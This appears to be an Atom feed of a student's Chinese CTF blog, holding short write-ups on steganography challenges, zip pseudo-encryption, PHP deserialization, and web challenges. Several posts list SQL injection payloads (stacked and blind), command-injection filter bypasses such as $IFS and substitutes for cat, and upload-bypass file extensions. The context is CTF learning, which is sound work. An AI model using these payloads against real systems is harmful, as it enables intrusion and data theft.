<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cxd的博客</title>
  
  
  <link href="http://cxdshibaba.github.io/atom.xml" rel="self"/>
  
  <link href="http://cxdshibaba.github.io/"/>
  <updated>2023-03-01T13:35:15.118Z</updated>
  <id>http://cxdshibaba.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>cat被过滤</title>
    <link href="http://cxdshibaba.github.io/2023/03/01/cat%E8%A2%AB%E8%BF%87%E6%BB%A4/"/>
    <id>http://cxdshibaba.github.io/2023/03/01/cat%E8%A2%AB%E8%BF%87%E6%BB%A4/</id>
    <published>2023-03-01T13:34:33.000Z</published>
    <updated>2023-03-01T13:35:15.118Z</updated>
    
    <content type="html"><![CDATA[<p>当cat被过滤后,可以使用一下命令进行读取文件的内容<br>(1)more:一页一页的显示的显示档案内容<br>(2)less:与more类似,但是比more更好的是,他可以[pg dn][pg up]翻页<br>(3)head:查看头几行<br>(4)tac:从最后一行开始显示,可以看出tac是cat的反向显示<br>(5)tail:查看尾几行<br>(6)nl:显示的时候,顺便输出行号<br>(7)od:以二进制的方式读取档案内容<br>(8)vi:一种编辑器，这个也可以查看<br>(9)vim:一种编辑器,这个也可以查看<br>(10)sort:可以查看<br>(11)uniq:可以查看<br>(12)file -f:报错出具体的内容</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;当cat被过滤后,可以使用一下命令进行读取文件的内容&lt;br&gt;(1)more:一页一页的显示的显示档案内容&lt;br&gt;(2)less:与more类似,但是比more更好的是,他可以[pg dn][pg up]翻页&lt;br&gt;(3)head:查看头几行&lt;br&gt;(4)tac:从最后一行开</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>文件上传绕过后缀的文件格式</title>
    <link href="http://cxdshibaba.github.io/2022/07/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80%E7%9A%84%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
    <id>http://cxdshibaba.github.io/2022/07/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80%E7%9A%84%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/</id>
    <published>2022-07-08T07:59:20.000Z</published>
    <updated>2022-07-12T08:55:05.376Z</updated>
    
    <content type="html"><![CDATA[<p>php,php3,php4,php5,phtml.pht，.htaccess</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;php,php3,php4,php5,phtml.pht，.htaccess&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>LINUX常用命令</title>
    <link href="http://cxdshibaba.github.io/2022/07/07/LINUX%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://cxdshibaba.github.io/2022/07/07/LINUX%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2022-07-07T07:42:32.000Z</published>
    <updated>2022-07-07T07:43:48.173Z</updated>
    
    <content type="html"><![CDATA[<p> Windows&amp;Linux打CTF/AWD常用命令_1stPeak的博客-CSDN博客_ctf exe文件](<a href="https://blog.csdn.net/qq_41617034/article/details/115583211">https://blog.csdn.net/qq_41617034/article/details/115583211</a>)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; Windows&amp;amp;Linux打CTF/AWD常用命令_1stPeak的博客-CSDN博客_ctf exe文件](&lt;a href=&quot;https://blog.csdn.net/qq_41617034/article/details/115583211&quot;&gt;https:/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ISCC MISC套中套</title>
    <link href="http://cxdshibaba.github.io/2022/06/02/ISCC-MISC%E5%A5%97%E4%B8%AD%E5%A5%97/"/>
    <id>http://cxdshibaba.github.io/2022/06/02/ISCC-MISC%E5%A5%97%E4%B8%AD%E5%A5%97/</id>
    <published>2022-06-02T14:20:13.000Z</published>
    <updated>2022-06-02T14:36:00.549Z</updated>
    
    <content type="html"><![CDATA[<p>打开文件，发现一个类似png的文件，在winhex打开，发现尾部有一串base64文字<br><img src="https://5fou.com/i/2022/06/02/10tej1n.png"><br>解开后为flag2: _ISCC_Zo2z，推测应该还有flag1,因为文件头与png不符合，补全后出现完整的png图片<br><img src="https://5fou.com/i/2022/06/02/10tefqw.png"><br>修改宽高得到flag1，<br><img src="https://5fou.com/i/2022/06/02/10wao6r.png"><br>组合起来原本以为是密码，结果不对，仔细看感觉flag1后面还有，修改合适CRC后放入StegSolve里发现了完整的flag1<br><img src="https://5fou.com/i/2022/06/02/10wakc3.png"><br>解开压缩包后分析python文件发现写的是一个加密的方法，向大佬要来脚本后跑出flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打开文件，发现一个类似png的文件，在winhex打开，发现尾部有一串base64文字&lt;br&gt;&lt;img src=&quot;https://5fou.com/i/2022/06/02/10tej1n.png&quot;&gt;&lt;br&gt;解开后为flag2: _ISCC_Zo2z，推测应该还有flag1</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ISCC MISC 擂台题666</title>
    <link href="http://cxdshibaba.github.io/2022/06/02/ISCC-MISC-%E6%93%82%E5%8F%B0%E9%A2%98666/"/>
    <id>http://cxdshibaba.github.io/2022/06/02/ISCC-MISC-%E6%93%82%E5%8F%B0%E9%A2%98666/</id>
    <published>2022-06-02T13:55:45.000Z</published>
    <updated>2022-06-02T14:18:31.477Z</updated>
    
    <content type="html"><![CDATA[<p>打开文件发现是一个伪加密，解开后是一张图片和一个真加密的压缩包，<br><img src="https://seikim.com/i/2022/06/02/10e05uv.png"><br>多次尝试后发现图片为steghide加密<br><img src="https://5fou.com/i/2022/06/02/10f4q4h.png"><br>接出一张图片，修改宽高后得到压缩包密码<br><img src="https://obohe.com/i/2022/06/02/10ggtmi.png"><br>解开后是一个流量包，拿去wireshark分析一下，其中发现一个网址<br><img src="https://5fou.com/i/2022/06/02/10kn5ic.png"><br>打开后发现一个gif动图，逐帧提取发去发现类似base64加密的文字<br><img src="https://seikim.com/i/2022/06/02/10nys8z.png"><br><img src="https://seikim.com/i/2022/06/02/10nys28.png"><br><img src="https://seikim.com/i/2022/06/02/10nyt2m.png"><br>第一张为base64加密，解出key为ISCC，后面两张为AES加密，解出flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打开文件发现是一个伪加密，解开后是一张图片和一个真加密的压缩包，&lt;br&gt;&lt;img src=&quot;https://seikim.com/i/2022/06/02/10e05uv.png&quot;&gt;&lt;br&gt;多次尝试后发现图片为steghide加密&lt;br&gt;&lt;img src=&quot;https://</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ISCC MISC</title>
    <link href="http://cxdshibaba.github.io/2022/06/02/ISCC-MISC/"/>
    <id>http://cxdshibaba.github.io/2022/06/02/ISCC-MISC/</id>
    <published>2022-06-02T13:43:42.000Z</published>
    <updated>2022-06-02T13:53:34.351Z</updated>
    
    <content type="html"><![CDATA[<p>由于做的时候忘记保存，我忘了做的是哪题，回收站里只找到一张图片，就随便做一下。<br><img src="https://obohe.com/i/2022/06/02/z8gc5a.png"><br>这张图片用许多隐写工具都没有发现什么，最后在别人提示下在stegsolve里发现发现端倪<br><img src="https://5fou.com/i/2022/06/02/zjm8tt.png"><br>在红绿蓝的0色道中发现了一些不同，将上面的16进制数先转为2进制，再转为字符串就得出flag<br><img src="https://seikim.com/i/2022/06/02/zktdcr.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;由于做的时候忘记保存，我忘了做的是哪题，回收站里只找到一张图片，就随便做一下。&lt;br&gt;&lt;img src=&quot;https://obohe.com/i/2022/06/02/z8gc5a.png&quot;&gt;&lt;br&gt;这张图片用许多隐写工具都没有发现什么，最后在别人提示下在stegsolve</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ISCC MISC降维打击</title>
    <link href="http://cxdshibaba.github.io/2022/06/02/ISCC-MISC%E9%99%8D%E7%BB%B4%E6%89%93%E5%87%BB/"/>
    <id>http://cxdshibaba.github.io/2022/06/02/ISCC-MISC%E9%99%8D%E7%BB%B4%E6%89%93%E5%87%BB/</id>
    <published>2022-06-02T13:02:28.000Z</published>
    <updated>2022-06-02T13:24:05.294Z</updated>
    
    <content type="html"><![CDATA[<p>打开文件发现一张图片，先拖去binwalk看一下<br><img src="https://i.bmp.ovh/imgs/2022/06/02/ff27bce59399e340.png"><br>这里发现有隐藏图片，分离得到下面图片<br><img src="https://obohe.com/i/2022/06/02/9ppo3l9.png"><br>尝试了多种解密方式，最后发现是zstge，解出一张图片<br><img src="https://5fou.com/i/2022/06/02/z0phm8.png"><br>网上查了许多，最后发现是魔女之旅的文字。。。。。。。<br><img src="https://seikim.com/i/2022/06/02/z3ltb6.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打开文件发现一张图片，先拖去binwalk看一下&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2022/06/02/ff27bce59399e340.png&quot;&gt;&lt;br&gt;这里发现有隐藏图片，分离得到下面图片&lt;br&gt;&lt;img src=&quot;https:/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>zsteg使用方法</title>
    <link href="http://cxdshibaba.github.io/2022/05/11/zsteg%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <id>http://cxdshibaba.github.io/2022/05/11/zsteg%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</id>
    <published>2022-05-11T02:56:51.000Z</published>
    <updated>2022-05-11T03:13:48.910Z</updated>
    
    <content type="html"><![CDATA[<p>查看帮助  zsteg -h<br>查看LSB信息 zsteg pcat.png<br>检测zlib  # -b的位数是从1开始的<br>zsteg zlib.bmp -b 1 -o xy -v<br>显示细节  zsteg pcat.png -v<br>尝试所有已知的组合  zsteg pcat.png -a<br>导出内容   zsteg -E “b1,bgr,lsb,yx” pcat.png &gt; p.exe</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;查看帮助  zsteg -h&lt;br&gt;查看LSB信息 zsteg pcat.png&lt;br&gt;检测zlib  # -b的位数是从1开始的&lt;br&gt;zsteg zlib.bmp -b 1 -o xy -v&lt;br&gt;显示细节  zsteg pcat.png -v&lt;br&gt;尝试所有已知的组合</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>常见文件开头</title>
    <link href="http://cxdshibaba.github.io/2022/05/02/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%BC%80%E5%A4%B4/"/>
    <id>http://cxdshibaba.github.io/2022/05/02/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%BC%80%E5%A4%B4/</id>
    <published>2022-05-02T01:51:52.000Z</published>
    <updated>2022-05-02T01:52:14.747Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://i.bmp.ovh/imgs/2022/05/02/410dfc141fc8cf54.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2022/05/02/410dfc141fc8cf54.png&quot;&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux管道符号和ls</title>
    <link href="http://cxdshibaba.github.io/2022/04/26/Linux%E7%AE%A1%E9%81%93%E7%AC%A6%E5%8F%B7%E5%92%8Cls/"/>
    <id>http://cxdshibaba.github.io/2022/04/26/Linux%E7%AE%A1%E9%81%93%E7%AC%A6%E5%8F%B7%E5%92%8Cls/</id>
    <published>2022-04-26T12:23:33.000Z</published>
    <updated>2022-04-26T12:27:21.140Z</updated>
    
    <content type="html"><![CDATA[<p>管道符：<br>多命令执行顺序<br>多命令执行符              格式                        作用<br>     ;               命令1;命令2             多个命令顺序执行，命令之间无任何逻辑关系<br>    &amp;&amp;               命令1&amp;&amp;命令2            逻辑与：当命令1正确执行后，命令2才会正确执行，否则命令2不会执行<br>    ||               命令1||命令2            逻辑或：当命令1不正确执行后，命令2才会正确执行，否则命令2不会执行</p><p>ls命令<br>概述：<br>用来查看当前文件夹下有哪些文件夹和文件的命令</p><p>-a –all的缩写，显示所有文件夹和文件，包括隐藏文件和文件夹（以点开头是隐藏的），还有当前目录和上级目录<br>[root@liuyi lianxi]# ls -a<br>.  ..  liusi1  .zhangsan</p><p>-A  –almost -all的缩写，显示所有文件夹和文件，包括隐藏文件和文件夹（以点开头是隐藏的），但不包括当前目录和上级目录<br>[root@liuyi lianxi]# ls -A<br>liusi1  .zhangsan</p><p>-h  –human-readable的缩写，将文件大小以可读懂的形式展现出来，如：GB，K，M等<br>[root@localhost ~]# ls -l -h<br>总用量 16K<br>-rw——-. 1 root root 1.3K 11月 18 20:51 anaconda-ks.cfg<br>drwxr-xr-x. 4 root root   37 11月 20 17:41 lianxi<br>drwxr-xr-x. 2 root root 8.0K 11月 20 17:12 liu</p><p>-l  ,显示当前目录下文件和文件夹的详细信息<br>[root@localhost ~]# ls -l<br>总用量 16<br>-rw——-. 1 root root 1241 11月 18 20:51 anaconda-ks.cfg<br>drwxr-xr-x. 4 root root   37 11月 20 17:41 lianxi<br>drwxr-xr-x. 2 root root 8192 11月 20 17:12 liu</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;管道符：&lt;br&gt;多命令执行顺序&lt;br&gt;多命令执行符              格式                        作用&lt;br&gt;     ;               命令1;命令2             多个命令顺序执行，命令之间无任何逻辑关系&lt;br&gt; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>空格被过滤可采用的方法</title>
    <link href="http://cxdshibaba.github.io/2022/04/26/%E7%A9%BA%E6%A0%BC%E8%A2%AB%E8%BF%87%E6%BB%A4%E5%8F%AF%E9%87%87%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://cxdshibaba.github.io/2022/04/26/%E7%A9%BA%E6%A0%BC%E8%A2%AB%E8%BF%87%E6%BB%A4%E5%8F%AF%E9%87%87%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95/</id>
    <published>2022-04-26T11:43:39.000Z</published>
    <updated>2022-07-23T06:06:40.753Z</updated>
    
    <content type="html"><![CDATA[<p>过滤空格的解决办法如下</p><p>$IFS<br>${IFS}<br>$IFS$1 //$1改成$加其他数字貌似都行<br>&lt;<br>&lt;&gt;<br>{cat,flag.php}  //用逗号实现了空格功能<br>%20<br>%09 </p><h5 id=""><a href="#" class="headerlink" title="/**/"></a>/**/</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;过滤空格的解决办法如下&lt;/p&gt;
&lt;p&gt;$IFS&lt;br&gt;${IFS}&lt;br&gt;$IFS$1 //$1改成$加其他数字貌似都行&lt;br&gt;&amp;lt;&lt;br&gt;&amp;lt;&amp;gt;&lt;br&gt;{cat,flag.php}  //用逗号实现了空格功能&lt;br&gt;%20&lt;br&gt;%09 &lt;/p&gt;
&lt;h5 i</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>php://filter 协议</title>
    <link href="http://cxdshibaba.github.io/2022/04/25/php-filter-%E5%8D%8F%E8%AE%AE/"/>
    <id>http://cxdshibaba.github.io/2022/04/25/php-filter-%E5%8D%8F%E8%AE%AE/</id>
    <published>2022-04-25T13:01:01.000Z</published>
    <updated>2022-04-25T13:03:42.006Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://i.bmp.ovh/imgs/2022/04/25/e8aa51b78f436428.png"><br>1是格式<br>2是可选参数，有read和write，字面意思就是读和写<br>3是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）<br>4是必选参数，后面写你要处理的文件名</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2022/04/25/e8aa51b78f436428.png&quot;&gt;&lt;br&gt;1是格式&lt;br&gt;2是可选参数，有read和write，字面意思就是读和写&lt;br&gt;3是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>序列化与反序列化</title>
    <link href="http://cxdshibaba.github.io/2022/04/12/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://cxdshibaba.github.io/2022/04/12/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-04-12T12:42:55.000Z</published>
    <updated>2022-04-14T08:50:51.575Z</updated>
    
    <content type="html"><![CDATA[<p>序列化通俗来讲就是将对象转化为可以传输的字符串；反序列化就是把那串可以传输的字符串再变回对象。<br>例：序列化将对象转化为可传输的字符串：<br>首先定义一个对象：</p><?phpclass chybeta{undefined        var $test = '123';}$class1 = new chybeta;    //这里就是创建啦一个新的对象$class1_ser = serialize($class1);   //将这个对象进行字符串封装，就是对其进行序列化print_r($class1_ser);?><p>这里输出的结果就是将对象序列化后的可传输的字符串;将这个php文件运行一下就可以啦：<br><img src="https://s3.bmp.ovh/imgs/2022/04/12/1ac671f5521a189b.png"><br>O:7:”chybeta”:1:{s:4:”test”;s:3:”123”;}<br>这里的O呢就是object对象的意思，数字7代表着对象的函数名有7个占位，然后就是对象名了这个数字1表示对象里有一个变量，大括号里的s代表的是string类型还有一个i是int型<br>                             魔法函数:<br>__constuct()    在创建对象是自动调用<br>__destuct()  相当于c++中的析构最后会将对象销毁，所以在对象销毁时 被调用<br>__toString()    但一个对象被当成字符串使用时被调用<br>__sleep()   当对象被序列化之前使用<br>__wakeup()  将在被序列化后立即被调用  //咱们这道题就是利用的这个来利用序列化的<br>这些就是经常在序列化与反序列化中遇到的魔法函数了,一般魔法函数是以__开头的,碰到时可想想能不能用序列化与反序列化漏洞<br>实例分析：<br><img src="https://s3.bmp.ovh/imgs/2022/04/14/7716c89a267c79f0.png"><br>__wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数，这是一个绕过点。<br>当被反序列化的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得_wakeup()函数失效，就是问题的关键所在。所以对其进行修改：<br>O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;序列化通俗来讲就是将对象转化为可以传输的字符串；反序列化就是把那串可以传输的字符串再变回对象。&lt;br&gt;例：序列化将对象转化为可传输的字符串：&lt;br&gt;首先定义一个对象：&lt;/p&gt;
&lt;?php

class chybeta{undefined

        var $test</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>堆叠注入</title>
    <link href="http://cxdshibaba.github.io/2022/04/12/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    <id>http://cxdshibaba.github.io/2022/04/12/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</id>
    <published>2022-04-12T11:14:35.000Z</published>
    <updated>2022-04-12T11:35:14.790Z</updated>
    
    <content type="html"><![CDATA[<p>首先发现题目过滤了以下关键字<br><img src="https://i.bmp.ovh/imgs/2022/04/12/f29ffb1c7f8e97de.png"><br>接下来尝试堆叠注入<br>查库：1’;show databases;–+<br><img src="https://i.bmp.ovh/imgs/2022/04/12/1d9547a6d4887d65.png"><br>查表：1’;show tables;–+<br><img src="https://s3.bmp.ovh/imgs/2022/04/12/a9578ab6c1a29a49.png"><br>分别查两个字段<br>1’; show columns from <code>1919810931114514</code> ;–+<br>1’; show columns from words ;–+<br>在1919810931114514中发现flag<br><img src="https://s3.bmp.ovh/imgs/2022/04/12/d94cb4e686054ad0.png"><br>接着可采取handler语句取flag<br>1’;handler <code>1919810931114514</code> open;handler <code>1919810931114514</code> read first;–+<br><img src="https://s3.bmp.ovh/imgs/2022/04/12/7ca5ac3abc251cf2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先发现题目过滤了以下关键字&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2022/04/12/f29ffb1c7f8e97de.png&quot;&gt;&lt;br&gt;接下来尝试堆叠注入&lt;br&gt;查库：1’;show databases;–+&lt;br&gt;&lt;img src=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>解zip伪加密</title>
    <link href="http://cxdshibaba.github.io/2022/04/10/%E8%A7%A3zip%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
    <id>http://cxdshibaba.github.io/2022/04/10/%E8%A7%A3zip%E4%BC%AA%E5%8A%A0%E5%AF%86/</id>
    <published>2022-04-10T07:08:26.000Z</published>
    <updated>2022-04-10T07:16:27.593Z</updated>
    
    <content type="html"><![CDATA[<p>一个ZIP压缩包由三个部分组成：压缩源文件数据区 + 压缩源文件目录区 + 压缩源文件目录结束标志。<br>50 4B 03 04，这是压缩源文件数据区头文件标记<br>50 4B 01 02，这是压缩源文件目录区头文件标记：<br>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性！<br>第二个数字为奇数时 –&gt;加密<br>第二个数字为偶数时 –&gt;未加密<br>例：<br>无加密<br>压缩源文件数据区的全局加密应当为00 00  （504B0304两个bytes之后）<br>且压缩源文件目录区的全局方式位标记应当为00 00（504B0102四个bytes之后）<br>假加密<br>压缩源文件数据区的全局加密应当为00 00 （504B0304两个bytes之后）<br>且压缩源文件目录区的全局方式位标记应当为09 00（504B0102四个bytes之后）<br>真加密<br>压缩源文件数据区的全局加密应当为09 00 （504B0304两个bytes之后）<br>且压缩源文件目录区的全局方式位标记应当为09 00 （504B0102四个bytes之后）<br><img src="https://s3.bmp.ovh/imgs/2022/04/10/305a2b0b2a5be547.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一个ZIP压缩包由三个部分组成：压缩源文件数据区 + 压缩源文件目录区 + 压缩源文件目录结束标志。&lt;br&gt;50 4B 03 04，这是压缩源文件数据区头文件标记&lt;br&gt;50 4B 01 02，这是压缩源文件目录区头文件标记：&lt;br&gt;全局方式位标记的四个数字中只有第二个数字</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>修改图片宽高</title>
    <link href="http://cxdshibaba.github.io/2022/04/10/%E4%BF%AE%E6%94%B9%E5%9B%BE%E7%89%87%E5%AE%BD%E9%AB%98/"/>
    <id>http://cxdshibaba.github.io/2022/04/10/%E4%BF%AE%E6%94%B9%E5%9B%BE%E7%89%87%E5%AE%BD%E9%AB%98/</id>
    <published>2022-04-10T07:04:37.000Z</published>
    <updated>2022-04-10T07:06:54.215Z</updated>
    
    <content type="html"><![CDATA[<p>winhex中可以修改图片宽高找到flag，从第二行开始，前四位是宽，后四位是高。<br><img src="https://s3.bmp.ovh/imgs/2022/04/10/f36e549b6978016c.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;winhex中可以修改图片宽高找到flag，从第二行开始，前四位是宽，后四位是高。&lt;br&gt;&lt;img src=&quot;https://s3.bmp.ovh/imgs/2022/04/10/f36e549b6978016c.png&quot;&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>dirsearch命令</title>
    <link href="http://cxdshibaba.github.io/2022/02/23/dirsearch%E5%91%BD%E4%BB%A4/"/>
    <id>http://cxdshibaba.github.io/2022/02/23/dirsearch%E5%91%BD%E4%BB%A4/</id>
    <published>2022-02-23T08:03:25.000Z</published>
    <updated>2022-02-23T08:06:55.854Z</updated>
    
    <content type="html"><![CDATA[<p>dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件。<br>-u 指定url<br>-e 指定网站语言<br>-w 可以加上自己的字典（带上路径）<br>-r 递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用）<br>–random-agents 使用代理（使用的代理目录在uesr-agents.txt中，可以自己添加）<br> 例：<br><img src="https://i.bmp.ovh/imgs/2022/02/1485fb69f2928d9c.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件。&lt;br&gt;-u 指定url&lt;br&gt;-e 指定网站语言&lt;br&gt;-w 可以加上自己的字典（带上路径）&lt;br&gt;-r 递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用）&lt;br&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>第一次参加闽盾杯</title>
    <link href="http://cxdshibaba.github.io/2021/12/03/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%8F%82%E5%8A%A0%E9%97%BD%E7%9B%BE%E6%9D%AF/"/>
    <id>http://cxdshibaba.github.io/2021/12/03/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%8F%82%E5%8A%A0%E9%97%BD%E7%9B%BE%E6%9D%AF/</id>
    <published>2021-12-03T10:03:57.000Z</published>
    <updated>2021-12-03T10:11:51.099Z</updated>
    
    <content type="html"><![CDATA[<p>昨天第一次参加闽盾杯，题目好难。。。随便写一题<br>附件下载打开后显示<br><img src="https://i.bmp.ovh/imgs/2021/12/215d13e5b6493d32.png"><br>题目提示Modbus/tcp中的最长的，用wireshark打开，在搜索栏输入tcp，点击length，找到flag<br><img src="https://i.bmp.ovh/imgs/2021/12/2d1d16fc379a5448.png"><br><img src="https://i.bmp.ovh/imgs/2021/12/8ad4c64f9550e638.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;昨天第一次参加闽盾杯，题目好难。。。随便写一题&lt;br&gt;附件下载打开后显示&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/12/215d13e5b6493d32.png&quot;&gt;&lt;br&gt;题目提示Modbus/tcp中的最长的，用wireshark</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>finalsql</title>
    <link href="http://cxdshibaba.github.io/2021/11/21/finalsql/"/>
    <id>http://cxdshibaba.github.io/2021/11/21/finalsql/</id>
    <published>2021-11-21T03:41:30.000Z</published>
    <updated>2021-11-21T03:48:41.352Z</updated>
    
    <content type="html"><![CDATA[<p>今天来看看学长布置的题目，，打开网页，在用户名和密码上分别输入order by、union select等字符，发现都被过滤掉<br><img src="https://i.bmp.ovh/imgs/2021/11/576b5a8e3c9d3a34.png"><br>接着按学长的提示，用python爆破盲注，偷一下学长的脚本<br><img src="https://i.bmp.ovh/imgs/2021/11/60af41f9dfe7db65.png"><br>flag就出来啦！！（脚本一点都看不懂）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天来看看学长布置的题目，，打开网页，在用户名和密码上分别输入order by、union select等字符，发现都被过滤掉&lt;br&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2021/11/576b5a8e3c9d3a34.png&quot;&gt;&lt;br&gt;接着按</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>less-8</title>
    <link href="http://cxdshibaba.github.io/2021/11/19/less-8/"/>
    <id>http://cxdshibaba.github.io/2021/11/19/less-8/</id>
    <published>2021-11-19T14:54:24.000Z</published>
    <updated>2021-11-19T15:05:30.029Z</updated>
    
    <content type="html"><![CDATA[<p>首先输入?id=1’，出现报错，说明存在漏洞注入，同时用联合查询语句都没有出现回显，说明本体为盲注，使用PyCharm爆破<br>首先写脚本，爆破库名，payload:and substr(database(),{},1)=’{}’–+<br><img src="https://s3.bmp.ovh/imgs/2021/11/40ac86564e6d5fa5.png"><br>找到库名为security<br>接着爆破表名，payload:nd substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1)=’{}’–+<br><img src="https://s3.bmp.ovh/imgs/2021/11/7fbd316092ee8c20.png"><br>接着查找users里面的数据，payload:and substr((select group_concat(column_name) from information_schema.columns where table_name=’users’),{},1)=’{}’–+<br><img src="https://s3.bmp.ovh/imgs/2021/11/60b607a19434dffe.png"><br>最后查找password和username<br><img src="https://s3.bmp.ovh/imgs/2021/11/d2ccc5020876c5b0.png"><br><img src="https://s3.bmp.ovh/imgs/2021/11/9e84d0f9b2c8ea8c.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先输入?id=1’，出现报错，说明存在漏洞注入，同时用联合查询语句都没有出现回显，说明本体为盲注，使用PyCharm爆破&lt;br&gt;首先写脚本，爆破库名，payload:and substr(database(),{},1)=’{}’–+&lt;br&gt;&lt;img src=&quot;https</summary>
      
    
    
    
    
  </entry>
  
</feed>
